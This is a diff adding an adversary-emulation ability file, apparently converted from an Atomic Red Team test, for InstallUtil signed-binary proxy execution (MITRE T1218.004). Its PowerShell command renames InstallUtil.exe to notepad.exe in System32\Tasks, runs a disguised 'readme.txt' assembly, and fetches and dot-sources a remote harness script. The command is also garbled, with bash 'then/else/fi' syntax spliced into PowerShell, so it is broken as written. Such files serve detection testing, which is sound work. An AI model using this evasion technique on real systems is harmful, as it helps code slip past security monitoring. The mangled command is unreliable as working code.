@@ -1,0 +1,75 @@
+- id: 559e6d06-bb42-4307-bff7-3b95a8254bad
+  name: InstallUtil evasive invocation
+  description: 'Executes an InstallUtil assembly by renaming InstallUtil.exe and using
+    a nonstandard extension for the assembly. Upon execution, "Running a transacted
+    installation."
+
+    will be displayed, along with other information about the opperation. "The transacted
+    install has completed." will be displayed upon completion.'
+  tactic: defense-evasion
+  technique:
+    attack_id: T1218.004
+    name: 'Signed Binary Proxy Execution: InstallUtil'
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path "PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1")
+          {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
+          "PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1") -ErrorAction
+          ignore | Out-Null; Invoke-WebRequest ''https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1''
+          -OutFile "PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1";
+          fi; # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly;
+          . "PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1"; $InstallerAssemblyDir
+          = "$Env:windir\System32\Tasks"; $InstallerAssemblyFileName = ''readme.txt'';
+          $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath
+          $InstallerAssemblyFileName; $CommandLine = "readme.txt"; $ExpectedOutput
+          = ''Constructor_''; # Explicitly set the directory so that a relative path
+          to readme.txt can be supplied.; Set-Location "$Env:windir\System32\Tasks";
+          Copy-Item -Path "$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe"
+          -Destination "$Env:windir\System32\Tasks\notepad.exe"; $TestArgs = @{; OutputAssemblyDirectory
+          = $InstallerAssemblyDir; OutputAssemblyFileName = $InstallerAssemblyFileName;
+          InvocationMethod = ''Executable''; CommandLine = $CommandLine; InstallUtilPath
+          = "$Env:windir\System32\Tasks\notepad.exe"; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly
+          @TestArgs -MinimumViableAssembly; if ($ActualOutput -ne $ExpectedOutput)
+          {; throw @"; Evasive Installutil invocation test failure. Installer assembly
+          execution output did not match the expected output.; Expected: $ExpectedOutput;
+          Actual: $ActualOutput; "@; }'
+        cleanup: Remove-Item -Path "$Env:windir\System32\Tasks\readme.txt" -ErrorAction
+          Ignore; Remove-Item -Path "$Env:windir\System32\Tasks\readme.InstallLog"
+          -ErrorAction Ignore; Remove-Item -Path "$Env:windir\System32\Tasks\readme.InstallState"
+          -ErrorAction Ignore; Remove-Item -Path "$Env:windir\System32\Tasks\notepad.exe"
+          -ErrorAction Ignore
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - defense-evasion
+  - atomic-red-team
+  - t1218.004
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      test_harness:
+        description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly
+        type: path
+        default: PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1
+    dependencies:
+    - description: 'InstallUtil test harness script must be installed at specified
+        location (#{test_harness})
+
+        '
+      prereq_command: 'if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory (split-path "#{test_harness}")
+        -ErrorAction ignore | Out-Null
+
+        Invoke-WebRequest ''https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1''
+        -OutFile "#{test_harness}"
+
+        '
+    technique_created: '2020-01-23T19:09:48.811Z'
+    atomic_guid: 559e6d06-bb42-4307-bff7-3b95a8254bad
+    import_timestamp: '2025-06-24T11:15:00.037861Z'
